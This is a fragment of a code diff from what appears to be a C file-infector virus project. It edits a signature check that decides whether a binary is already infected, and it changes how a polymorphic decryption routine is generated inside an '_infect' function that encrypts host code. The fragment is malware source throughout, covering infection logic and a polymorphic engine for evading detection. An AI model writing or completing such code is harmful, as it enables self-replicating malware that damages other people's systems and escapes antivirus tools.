@@ -10,7 +10,7 @@ int get_sig(char *s, size_t n, size_t virus_len, char *sig)
 	size_t sig_len = slen(sig);
 
 	if (entry + virus_len >= n)
-		return fail("invalid entry point");
+		return FALSE; //not infected
 
 	size_t i;
 	size_t sig_sum = 0;;
@@ -115,8 +115,10 @@ static int _infect(char **s, size_t *n, struct s_infect_params p, struct s_opt o
 	//encryption
 	bool compressed;
 
-	void *route = (void*)(*s + p.decrypt_routine_off);
-	poly_generate(&p.encrypt_routine, &route);
+	void *route = (void*)(*s + pos + p.decrypt_routine_off + 0x2C);
+	void *xx = ft_malloc(1024);
+	debug_ext("DECR", p.decrypt_routine_off, "\n");
+	poly_generate(&p.encrypt_routine, &xx);
 	//---------- z2 (encryption without compression) -------------
 	compressed = FALSE;
 	if (encrypt(((*s) + pos + p.cmpr_off), p.cmpr_len, (uint32_t*)key, &compressed, p.encrypt_routine) == -1)
